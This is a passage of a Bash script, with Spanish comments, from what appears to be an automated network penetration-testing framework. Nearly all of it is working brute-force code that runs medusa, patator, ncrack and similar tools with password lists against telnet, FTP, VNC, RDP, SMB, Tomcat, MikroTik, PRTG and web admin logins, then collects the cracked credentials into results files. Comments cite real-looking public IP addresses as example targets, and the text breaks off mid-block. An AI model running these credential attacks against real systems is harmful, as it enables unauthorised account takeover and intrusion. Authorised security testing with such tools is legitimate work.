# 		echo "nmap -n -sT -sV -p $port -Pn --script=mongodb-brute $ip"  > logs/vulnerabilidades/"$ip"_mongo_passwordBD.txt 2>/dev/null 
# 		nmap -n -sT -sV -p $port -Pn --script=mongodb-databases $ip  >> logs/vulnerabilidades/"$ip"_mongo_passwordBD.txt 2>/dev/null 
# 		grep "|" logs/vulnerabilidades/"$ip"_mongo_passwordBD.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR" > .vulnerabilidades/"$ip"_mongo_passwordBD.txt 				
# 	done	
# 	#insert clean data	
# 	insert_data	
# fi


#if [ -f servicios/vmware.txt ]
#then

	#if [ "$TYPE" = NULL ] ; then
		#echo -e "\n\t $OKBLUE Encontre servicios de vmware activos. Realizar ataque de passwords ? s/n $RESET"	  
		#read bruteforce	     
	#fi
	  	
	#if [[ $TYPE = "total" ]] || [ $bruteforce == "s" ]; then 
      	  
	  #echo -e "$OKBLUE\n\t#################### Testing common pass vmware ######################$RESET"	
	  #for line in $(cat servicios/vmware.txt); do
		#ip=`echo $line | cut -f1 -d":"`
		#port=`echo $line | cut -f2 -d":"`
		#echo -e "[+] Probando $ip"
#		medusa -t 1 -f -e ns -u root -P passwords.txt -h $ip -M vmauthd | tee -a  logs/cracking/"$ip"_vmware.txt	
		#medusa -t 1 -f -e ns -u $ENTIDAD  -P passwords.txt -h $ip -M vmauthd | tee -a  logs/cracking/"$ip"_vmware.txt
		#grep --color=never SUCCESS logs/cracking/"$ip"_vmware.txt > .vulnerabilidades/"$ip"_vmware_passwordAdivinadoServ.txt
#		echo ""			
	 #done
	 #insert_data
#	fi # if bruteforce
#fi


# if [ -f servicios/mongoDB.txt ] TODO
# then     	  
# 	echo -e "$OKBLUE\n\t#################### Testing  mongoDB ######################$RESET"	
# 	for line in $(cat servicios/mongoDB.txt); do
# 		ip=`echo $line | cut -f1 -d":"`
# 		port=`echo $line | cut -f2 -d":"`
# 		echo -e "[+] Probando $ip"
# 		echo "nmap -n -sV -p $port --script=mongodb-brute $ip"  > logs/cracking/"$ip"_mongo_passwordBD.txt 2>/dev/null 
# 		nmap -n -sV -p $port --script=mongodb-brute $ip  >> logs/cracking/"$ip"_mongo_passwordBD.txt 2>/dev/null 
# 		# -- |     root:Password1 - Valid credentials		
# 		respuesta=`grep --color=never -iq "Valid credentials" logs/cracking/"$ip"_mongo_passwordBD.txt `
# 		greprc=$?
# 		if [[ $greprc -eq 0 ]] ; then
# 			echo -n "[MongoDB] $respuesta" >> .vulnerabilidades/"$ip"_mongo_passwordBD.txt
# 		fi					 
# 		echo ""
# 	done
# 	insert_data	
# fi


# if [ -f servicios/redis.txt ] TODO
# then
	 	  
# 	echo -e "$OKBLUE\n\t#################### Testing common pass redis ######################$RESET"	
# 	for line in $(cat servicios/redis.txt); do
# 		ip=`echo $line | cut -f1 -d":"`
# 		port=`echo $line | cut -f2 -d":"`
# 		echo -e "\n\t########### $ip #######"			
# 		echo "nmap -n -sV -p $port --script=redis-brute $ip"  > logs/cracking/"$ip"_mongo_passwordBD.txt 2>/dev/null 
# 		nmap -n -sV -p $port --script=redis-brute $ip  >> logs/cracking/"$ip"_mongo_passwordBD.txt 2>/dev/null 		
# 		respuesta=`grep --color=never -iq "Valid credentials" logs/cracking/"$ip"_mongo_passwordBD.txt `
# 		greprc=$?
# 		if [[ $greprc -eq 0 ]] ; then
# 			echo -n "[Redis] $respuesta" >> .vulnerabilidades/"$ip"_mongo_passwordBD.txt
# 		fi			
# 		echo ""			
# 	done
# 	insert_data	
# fi

# if [ -f servicios/cisco401.txt ]
	# then	
		
	# 	echo -e "\n\t $OKBLUE Encontre dispositivos CISCO activos. Realizar ataque de passwords ? s/n $RESET"	  
				
	# 	sed -i '1 i\cisco' passwords.txt	#adicionar password cisco
	# 	echo -e "$OKBLUE\n\t#################### Testing pass CISCO ######################$RESET"	
	# 	for ip in $(cat servicios/cisco401.txt); do			
	# 		egrep -iq "80/open" .nmap_1000p/"$ip"_tcp.grep
	# 		greprc=$?
	# 		if [[ $greprc -eq 0 ]] ; then			
	# 			echo -e "[+] Probando $ip"
	# 			echo "patator.py http_fuzz method=GET url=\"http://$ip/\" user_pass=cisco:FILE0 0=passwords.txt -e user_pass:b64 --threads=1" >> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt
	# 			patator.py http_fuzz method=GET url="http://$ip/" user_pass=cisco:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt 2>> logs/cracking/"$ip"_80_passwordAdivinadoServ.txt
	# 			respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_80_passwordAdivinadoServ.txt`
	# 			greprc=$?
	# 			if [[ $greprc -eq 0 ]] ; then
	# 				echo -n "[Cisco] Usuario:cisco $respuesta" >> .vulnerabilidades/"$ip"_80_passwordAdivinadoServ.txt
	# 			fi				
	# 		fi
						
	# 	done
	# 	insert_data	 
	# fi





if [[ "$MODE" == "total" ]] ; then	
		
	### telnet #########
	if [ -f servicios/telnet.txt ]
	then
		echo -e "$OKBLUE\n\t#################### Testing pass TELNET ######################$RESET"	
		for line in $(cat servicios/telnet.txt); do
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`
			medusa -t 1 -f -e ns -u $ENTIDAD -P passwords.txt -h $ip -M telnet >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
			medusa -t 1 -f -e ns -u root -P passwords.txt -h $ip -M telnet >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
		done	
	fi

	####################

	if [ -f servicios/PRTG.txt ]
	then 
			
		echo -e "$OKBLUE\n\t#################### Testing PRTG ######################$RESET"	
		sed -i '1 i\prtgadmin' passwords.txt	#adicionar password prtgadmin
		for line in $(cat servicios/PRTG.txt); do
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`								
			echo -e "[+] Probando $ip:$port"
			echo "passWeb -proto https -target $ip -port $port -path / -module PRTG -user prtgadmin -passfile passwords.txt" > logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
			passWeb -proto https -target $ip -port $port -path / -module PRTG -user prtgadmin -passfile passwords.txt >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
			grep --color=never 'encontrado' logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
			echo ""			
		done
		insert_data

	fi


	if [ -f servicios/pentaho.txt ]
	then
		echo -e "\n\t $OKBLUE Encontre sistemas de Pentaho activos.  $RESET"	  
				
		echo -e "$OKBLUE\n\t#################### Testing Pentahoo ######################$RESET"	
		for line in $(cat servicios/pentaho.txt); do
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`
						
			echo -e "[+] Probando $ip"
			echo "passWeb -proto https -target $ip -port $port -path / -module pentaho -user admin -passfile passwords-web-specific.txt" > logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
			passWeb -proto https -target $ip -port $port -path / -module pentaho -user admin -passfile passwords-web-specific.txt >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt
			sleep 2
			grep --color=never 'encontrado' logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt | tee -a .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
			
			echo ""			
		done
		insert_data	
	fi

	if [ -f servicios/web401.txt ]
	then     	
			
		echo -e "$OKBLUE\n\t#################### Testing pass web (401) ######################$RESET"	
		for line in $(cat servicios/web401.txt); do
			echo -e "[+] Probando $line"			
			
			if [[ ${line} == *"http"*  ]];then 							
				#line = http://200.87.193.109:80/phpmyadmin/
				ip=`echo $line | cut -d ":" -f2 | tr -d "/"`			
				port=`echo $line | cut -d "/" -f 3| cut -d ":" -f2`	
				
				#probar con usuario admin
				patator.py http_fuzz method=GET url="$line" user_pass=admin:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinado1.txt
				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinado1.txt`
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then
					echo -n "[AdminWeb] Usuario:admin $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
				fi	
				
				#probar con usuario root
				patator.py http_fuzz method=GET url="$line" user_pass=root:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinado2.txt			
				respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinado2.txt`
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then
					echo -n "[AdminWeb] Usuario:root $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
				fi
							
			else
				#line=10.0.0.2:80
				ip=`echo $line | cut -f1 -d":"`
				port=`echo $line | cut -f2 -d":"`
				if [[ ${port} == *"443"*  ]];then 	
					#probar con usuario admin
					patator.py http_fuzz method=GET url="https://$ip/" user_pass=admin:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinado1.txt
					respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinado1.txt`
					greprc=$?
					if [[ $greprc -eq 0 ]] ; then
						echo -n "[AdminWeb] Usuario:admin $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
					fi	
				
					#probar con usuario root
					patator.py http_fuzz method=GET url="http://$ip/" user_pass=root:FILE0 0=passwords.txt -e user_pass:b64 --threads=1 >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinado2.txt			
					respuesta=`grep --color=never '200 OK' logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordAdivinado2.txt`
					greprc=$?
					if [[ $greprc -eq 0 ]] ; then
						echo -n "[AdminWeb] Usuario:root $respuesta" >> .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt
					fi
				fi
			fi
								
		done
		insert_data
	fi

	#check
	if [ -f servicios/ZKSoftware.txt ]
	then

		echo -e "$OKBLUE\n\t#################### Testing pass ZKSoftware ######################$RESET"	
		for line in $(cat servicios/ZKSoftware.txt); do
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`				
			echo -e "[+] Probando $ip"		
			echo -e "passWeb -proto http -target $ip -port $port -module ZKSoftware -user administrator -passfile passwords-web-specific.txt" > logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordZKSoftware.txt
			passWeb -proto http -target $ip -port $port -module ZKSoftware -user administrator -passfile passwords-web-specific.txt >> logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordZKSoftware.txt
			grep --color=never 'encontrado' logs/cracking/"$ip"_"$port-$path_web_sin_slash"_passwordZKSoftware.txt | tee -a .vulnerabilidades/"$ip"_"$port-$path_web_sin_slash"_passwordZKSoftware.txt
			echo ""			
		done
		insert_data
		
	fi

	if [ -f servicios/MikroTik.txt ]
	then
						
		echo -e "$OKBLUE\n\t#################### Testing common pass MikroTik ######################$RESET"	
		for ip in $(cat servicios/MikroTik.txt); do		
			echo -e "[+] Probando $ip"
					
			echo "mkbrutus.py -t $ip -u admin --dictionary passwords.txt" >>  logs/cracking/"$ip"_8728_passwordMikroTik.txt		
			mkbrutus.py -t $ip -u admin --dictionary passwords.txt>>  logs/cracking/"$ip"_8728_passwordMikroTik.txt
			
			echo "" >> logs/cracking/"$ip"_8728_passwordMikroTik.txt
			echo "mkbrutus.py -t $ip -u $ENTIDAD --dictionary passwords.txt" >> logs/cracking/"$ip"_8728_passwordMikroTik.txt
			mkbrutus.py -t $ip -u $ENTIDAD --dictionary passwords.txt>> logs/cracking/"$ip"_8728_passwordMikroTik.txt

			grep --color=never successful logs/cracking/"$ip"_8728_passwordMikroTik.txt | grep -v "unsuccessful" > .vulnerabilidades/"$ip"_8728_passwordMikroTik.txt
					
			echo ""			
		done
		insert_data	
	fi
	

	if [ -f servicios/ftp.txt ]
	then 
			
		echo -e "$OKBLUE\n\t#################### Testing pass FTP ######################$RESET"	
		for line in $(cat servicios/ftp.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		
		######## revisar si no es impresora #####
		#banner ftp
		egrep -iq "Printer|JetDirect|LaserJet|KONICA|MULTI-ENVIRONMENT|Xerox" .banners2/"$ip"_21.txt
		noImpresora_port21=$?
		
		#banner telnet						
		noImpresora_port23=1		
		if [ -f .banners2/"$ip"_23.txt ] 
		then				
			egrep -iq "Printer|JetDirect|LaserJet|KONICA|MULTI-ENVIRONMENT|Xerox" .banners2/"$ip"_23.txt 2>/dev/null
			noImpresora_port23=$?
		fi
		
		#banner web
		noImpresora_port80=1		
		if [ -f .enumeracion2/"$ip"_80_webData.txt ] 
		then	
			egrep -iq "Printer|JetDirect|LaserJet|KONICA|MULTI-ENVIRONMENT|Xerox" .enumeracion2/"$ip"_80_webData.txt 2>/dev/null
			noImpresora_port80=$?
		fi
				
		echo "noImpresora_port21 $noImpresora_port21 noImpresora_port80 $noImpresora_port80 noImpresora_port23 $noImpresora_port23"
		if [[ $noImpresora_port21 -eq 1 && $noImpresora_port80 -eq 1 && $noImpresora_port23 -eq 1 ]] ; then			
			echo -e "[+] Probando $ip"		
			
			#echo -e "\n medusa -t 1 -f -e ns -u admin -P passwords.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
			#medusa -t 1 -f -e ns -u admin -P passwords.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
			
			#echo -e "\n medusa -t 1 -f -u root -P passwords.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
			#medusa -t 1 -f -u root -P passwords.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
			
			echo -e "\n medusa -t 1 -f -u ftp -P passwords.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt					
			medusa -t 1 -f -u ftp -P passwords.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt					
			
			respuesta=`grep --color=never SUCCESS logs/cracking/"$ip"_21_passwordAdivinadoServ.txt`
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[FTP] $respuesta" | grep -iv 'passFakeTest123' >> .vulnerabilidades/"$ip"_21_passwordAdivinadoServ.txt
			fi
			
			echo ""		
		else			
			echo -e "\t[+] Es una impresora"			

			echo ""		
		fi	
		#######################################		
				
		done
		insert_data	 
	fi


	if [ -f servicios/vnc.txt ]
	then   	  
		echo -e "$OKBLUE\n\t#################### Testing common pass VNC (lennnto) ######################$RESET"	
		for line in $(cat servicios/vnc.txt); do
			ip=`echo $line | cut -f1 -d":"`
			port=`echo $line | cut -f2 -d":"`
			echo -e "\n\t########### $ip #######"

			while true; do			
				free_ram=`free -m | grep -i mem | awk '{print $7}'`		
				script_instancias=$((`ps aux | egrep 'patator|medusa|ncrack' | wc -l` - 1)) 							
				if [[ $free_ram -gt $MIN_RAM && $script_instancias -lt $MAX_SCRIPT_INSTANCES  ]];then 										
					ncrack --user "$admin_user" -P passwords.txt -g cd=8 $ip:$port | tee -a  logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt &
					echo ""				
					break
				else								
					script_instancias=`ps aux | egrep 'patator|medusa|ncrack' | egrep -v 'discover.sh|lanscanner.sh|autohack.sh|heka.sh|grep -E'| wc -l`
					echo -e "\t[-] Scripts online ($script_instancias) RAM = $free_ram Mb "
					sleep 5									
				fi		
			done # while true
		done #ip
	fi #if
fi #modo total

#echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
#grep -ira "timed out" logs/cracking/* 2>/dev/null >> errores.log
#grep -ira "Can't connect" logs/cracking/* 2>/dev/null >> errores.log

######## wait to finish########
while true; do
	scan_instancias=$((`ps aux | egrep 'medusa|passWeb|patator|crackmapexec|WpCrack' | egrep -v 'color|keyring|vscode-server|responder' | wc -l` - 1)) 
	if [ "$scan_instancias" -gt 0 ]
	then
		echo -e "\t[i] Todavia hay escaneos activos ($scan_instancias)"  
		sleep 30
	else
		break		  		 
	fi				
done
##############################

############################## PARSE ############################

if [ -f servicios/vnc.txt ]
then
    echo -e "$OKBLUE #################### PARSE (`wc -l servicios/vnc.txt`) ######################$RESET"	    
	 for line in $(cat servicios/vnc.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Parse $ip:$port"	
		grep --color=never "$admin_user" logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
	done
fi	

if [ -f servicios/postgres.txt ]
then
    echo -e "$OKBLUE #################### PARSE (`wc -l servicios/postgres.txt`) ######################$RESET"	    
	 for line in $(cat servicios/postgres.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Parse $ip:$port"	
		grep --color=never SUCCESS logs/cracking/"$ip"_5432_passwordBD.txt > .vulnerabilidades/"$ip"_5432_passwordBD.txt
	done
fi	

if [ -f servicios/mysql.txt ]
then
    echo -e "$OKBLUE #################### PARSE (`wc -l servicios/mysql.txt`) ######################$RESET"	    
	 for line in $(cat servicios/mysql.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Parse $ip:$port"	
		grep --color=never -i SUCCESS logs/cracking/"$ip"_3306_passwordBD.txt > .vulnerabilidades/"$ip"_3306_passwordBD.txt
	done
fi	

if [ -f servicios/mssql.txt ]
then
    echo -e "$OKBLUE #################### PARSE (`wc -l servicios/mssql.txt`) ######################$RESET"	    
	 for line in $(cat servicios/mssql.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`	
		echo -e "[+] Parse $ip:$port"	
		grep --color=never SUCCESS logs/cracking/"$ip"_1433_passwordBD.txt > .vulnerabilidades/"$ip"_1433_passwordBD.txt
	done
fi	


#PARSE
if [ -f servicios/ssh.txt ]
then		
	echo -e "$OKBLUE #################### PARSE (`wc -l servicios/ssh.txt`) ######################$RESET"	    
	for line in $(cat servicios/ssh.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Parse $ip:$port"				
		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null					
	 done	
	insert_data
fi

#PARSE
if [ -f servicios/only_rdp.txt ]
then		
	echo -e "$OKBLUE #################### PARSE (`wc -l servicios/only_rdp.txt`) ######################$RESET"	    
	for line in $(cat servicios/only_rdp.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Parse $ip:$port"				
				
		grep -v 'Progress' logs/cracking/"$ip"_3389_passwordAdivinadoWin2-"$admin_user".txt > logs/cracking/"$ip"_"$admin_user"-3389_passwordAdivinadoWin.txt 
		rm logs/cracking/"$ip"_3389_passwordAdivinadoWin2-"$admin_user".txt
		egrep -q  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK" logs/cracking/"$ip"_"$admin_user"-3389_passwordAdivinadoWin.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then	
			echo -e "\t$OKRED[!] Password found \n $RESET"
			creds=`egrep  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK"  logs/cracking/"$ip"_"$admin_user"-3389_passwordAdivinadoWin.txt| awk '{print $9}'`
			echo "$admin_user:$creds" >> .vulnerabilidades/"$ip"_3389_passwordAdivinadoWin.txt
		fi	
		
		if [[ ! -z $ENTIDAD ]];then
			grep -v 'Progress' logs/cracking/"$ip"_3389_passwordAdivinadoWin2-"$ENTIDAD".txt > logs/cracking/"$ip"_"$ENTIDAD"-3389_passwordAdivinadoWin.txt 2>/dev/null
			rm logs/cracking/"$ip"_3389_passwordAdivinadoWin2-"$ENTIDAD".txt
			egrep -iq  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK" logs/cracking/"$ip"_"$ENTIDAD"-3389_passwordAdivinadoWin.txt
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then	
				echo -e "\t$OKRED[!] Password found \n $RESET"
				creds=`egrep  "\| ERRCONNECT_PASSWORD_EXPIRED|\| OK"  logs/cracking/"$ip"_"$ENTIDAD"-3389_passwordAdivinadoWin.txt | awk '{print $9}'`
				echo "$ENTIDAD:$creds" >> .vulnerabilidades/"$ip"_3389_passwordAdivinadoWin.txt
			fi	
		fi
						
	 done	
	insert_data
fi


if [ -f servicios/telnet.txt ]
then		
	echo -e "$OKBLUE #################### PARSE (`wc -l servicios/telnet.txt`) ######################$RESET"	    
	for line in $(cat servicios/telnet.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Parse $ip:$port"				
		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
	 done	
	insert_data
fi




#PARSE
if [ -f servicios/admin-web-custom-inserted.txt ]
then	  		  
	echo -e "$OKBLUE #################### PARSE (`wc -l servicios/admin-web-custom-inserted.txt`) ######################$RESET"	    

	
	while IFS= read -r line 
	do
		ip_port_path=`echo $line | cut -d ";" -f 1` #https://200.58.87.208:443/wp-login.php
		fingerprint=`echo $line | cut -d ";" -f 2`
		echo -e "\n\t########### "$ip_port_path #######"	
			
		host_port=`echo $ip_port_path | cut -d "/" -f 3` # 190.129.69.107  - 190.129.69.107:8080
		proto_http=`echo $ip_port_path | cut -d ":" -f 1`
		if [[ ${host_port} == *":"* ]]; then
			port=`echo $host_port | cut -d ":" -f 2`	
		else
			if [[  ${proto_http} == *"https"* ]]; then
				port="443"
			else
				port="80"
			fi
		fi
		host=`echo $host_port | cut -d ":" -f 1`
		path_web=`echo $ip_port_path | cut -d "/" -f 4-5`	
		path_web=`echo "/"$path_web`
		path_web_sin_slash=$(echo "$path_web" | tr -d '/')
		


		egrep --color=never -i 'Password encontrado|sistema sin password' logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt 2>/dev/null | sort | uniq > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_passwordPhpMyadmin.txt	 
		
		if [[ $fingerprint = *"joomla"* ]]; then
			grep --color=never 'Password encontrado' logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordCMS-joomla.txt 2>/dev/null| sort | uniq > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_passwordCMS-joomla.txt 
		fi

		if [[ $fingerprint = *"wordpress"* ]]; then
			path_web_sin_slash=`echo $path_web_sin_slash |sed 's/wp-login.php//g'`
			grep --color=never 'Username' logs/cracking/"$host"_*-"$port"-"$path_web_sin_slash"_passwordCMS-wordpress.txt > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_passwordCMS-wordpress.txt
		fi

		if [[ $fingerprint = *'tomcat admin'* ]]; then
		
			egrep -iq "INFO - 200" logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt 
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then			
				echo -e "\t\t[i] Password encontrado"				
								
				# 09:55:46 patator    INFO - 200  22077:-1       0.522 | tomcat:s3cret                      |    25 | HTTP/1.1 200
				creds=`grep --color=never "INFO - 200" logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt  | cut -d "|" -f 2 | tr -d ' '`
				echo "$ip_port_path (Creds $creds)" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt 
			else
				echo -e "\t\t[+] Bruteforcing passwords (user=tomcat)"	
				#echo "patator.py http_fuzz method=GET url="$ip_port_path user_pass=tomcat:FILE0 0=passwords.txt -e user_pass:b64 --threads=3" >> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt  				
				patator.py http_fuzz method=GET url=$ip_port_path user_pass=tomcat:FILE0 0=passwords.txt -e user_pass:b64 --threads=3 > logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt  2>> logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt 	
				egrep -iq "INFO - 200" logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt 
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then			
					echo -e "\t\t[i] Password encontrado"
					# 12:56:35 patator.py    INFO - 200  16179:-1       0.005 | tomcat                             |   133 | HTTP/1.1 200 OK
					password=`grep --color=never "INFO - 200" logs/cracking/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt  | cut -d "|" -f 2 | tr -d ' '`
					echo "$ip_port_path \(Usuario:tomcat Password:$password\)" > .vulnerabilidades/"$host"_"$port-$path_web_sin_slash"_passwordAdminWeb.txt 
				fi
			fi																							
		fi	

	done < servicios/admin-web-custom-inserted.txt	
	insert_data
fi


if [ -f servicios/WindowsAlive.txt ]
then
	echo -e "$OKBLUE #################### PARSE (`wc -l servicios/WindowsAlive.txt`) ######################$RESET"	    		
	for ip in $(cat servicios/WindowsAlive.txt); do	
		echo -e "[+] Parse $ip"					
		grep -iq 'allows sessions using username' .vulnerabilidades2/"$ip"_445_nullsession.txt	2>/dev/null	
		
		sed -i '/remaining/d' logs/cracking/"$ip"_"$admin_user"-smb_passwordAdivinadoWin.txt 2>/dev/null	
		sed -i '/remaining/d' logs/cracking/"$ip"_sistemas-windows_passwordAdivinadoWin.txt 2>/dev/null
		sed -i '/remaining/d' logs/cracking/"$ip"_"$ENTIDAD"-smb_passwordAdivinadoWin.txt 2>/dev/null
		sed -i '/remaining/d' logs/cracking/"$ip"_soporte-windows_passwordAdivinadoWin.txt 2>/dev/null

		greprc=$?
		if [[ $greprc -eq 0 ]] ; then	
			echo -e "[+] Null session detectada en $ip"
		else
			passwords_ok=`grep -qi windows logs/cracking/"$ip"_"$admin_user"-smb_passwordAdivinadoWin.txt`			
			if [[  $passwords_ok -lt 3 ]];then 
				password_smb=`grep -i windows logs/cracking/"$ip"_"$admin_user"-smb_passwordAdivinadoWin.txt 2>/dev/null| awk {'print $9'}`
				if [[ -n "$password_smb" ]];then
					echo "Usuario:$admin_user Password:$password_smb" >	.vulnerabilidades/"$ip"_smb_passwordAdivinadoWin.txt
				fi
			fi
						
			passwords_ok=`grep -qi windows logs/cracking/"$ip"_soporte-windows_passwordAdivinadoWin.txt 2>/dev/null`
			if [[  $passwords_ok -lt 3 ]];then 
				password_smb=`grep -i windows logs/cracking/"$ip"_soporte-windows_passwordAdivinadoWin.txt 2>/dev/null| awk {'print $9'}`
				if [[ -n "$password_smb" ]];then
					echo "Usuario:soporte Password:$password_smb" >> .vulnerabilidades/"$ip"_smb_passwordAdivinadoWin.txt
				fi
			fi
			
			if [ ! -z $ENTIDAD ] ; then
				passwords_ok=`grep -qi windows logs/cracking/"$ip"_"$ENTIDAD"-smb_passwordAdivinadoWin.txt 2>/dev/null`
				if [[  $passwords_ok -lt 3 ]];then 
					password_smb=`grep -i windows logs/cracking/"$ip"_"$ENTIDAD"-smb_passwordAdivinadoWin.txt 2>/dev/null | awk {'print $9'}`
					if [[ -n "$password_smb" ]];then
						echo "Usuario:$ENTIDAD Password:$password_smb" >> .vulnerabilidades/"$ip"_smb_passwordAdivinadoWin.txt
					fi
				fi	
			fi
					

			passwords_ok=`grep -qi windows logs/cracking/"$ip"_sistemas-windows_passwordAdivinadoWin.txt 2>/dev/null`			
			if [[  $passwords_ok -lt 3 ]];then 
				password_smb=`grep -i windows logs/cracking/"$ip"_sistemas-windows_passwordAdivinadoWin.txt 2>/dev/null| awk {'print $9'} `
				if [[ -n "$password_smb" ]];then
					echo "Usuario:sistemas Password:$password_smb" >> .vulnerabilidades/"$ip"_smb_passwordAdivinadoWin.txt
				fi
			fi
			
		fi										
	 done	
	 insert_data
fi


# if [ -f servicios/pop.txt ]
# then
# 	echo -e "\n\t $OKBLUE Encontre servicios de POP activos. Realizar ataque de passwords ? s/n $RESET"	  
# 	read bruteforce	  
	  
# 	if [ $bruteforce == 's' ]
#     then     			
#       echo -e "\n\t $OKBLUE Archivo con la lista de usuarios? Formato: Daniel;Torres;Sandi $RESET"	  
# 	  read users_file  	  
	  
# 	  echo -e "$OKBLUE\n\t#################### Testing common pass POP ######################$RESET"	
# 	  for line in $(cat servicios/pop.txt); do
# 		ip=`echo $line | cut -f1 -d":"`
# 		port=`echo $line | cut -f2 -d":"`
# 		echo -e "\n\t########### $ip #######"	
# 		for fullname in $(cat $users_file); do
# 			echo -e "\n\t########### Testing fullname $fullname #######"			
# 			generate_password.pl "$fullname" > passwords2.txt # password en base a su usuario
# 			head -1 passwords2.txt > base.txt # solo primer nombre
# 			passGen.sh -f base.txt -t top50 -o passwords3.txt # mutaciones de su nombre
